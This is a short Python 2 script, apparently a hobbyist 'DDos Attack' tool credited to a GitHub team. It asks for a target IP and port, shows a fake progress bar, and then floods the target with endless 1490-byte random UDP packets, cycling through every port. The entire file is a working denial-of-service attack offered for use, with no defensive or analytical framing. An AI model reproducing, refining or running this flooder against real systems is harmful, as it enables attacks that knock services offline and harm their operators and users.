import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Creator   : Pasargad Digital Security Team"
print "github    :  github.com/pasargadteam"
print
ip = raw_input("IP Target : ")
port = input("Port      : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                     ] 0% "
time.sleep(5)
print "[===                  ] 17%"
time.sleep(3)
print "[====                 ] 28%"
time.sleep(2)
print "[========             ] 36%"
time.sleep(3)
print "[===========          ] 44%"
time.sleep(2)
print "[=============        ] 51% "
time.sleep(3)
print "[===============      ] 72%"
time.sleep(2)
print "[=================    ] 80%"
time.sleep(3)
print "[==================== ] 91%"
time.sleep(2)
print "[=====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
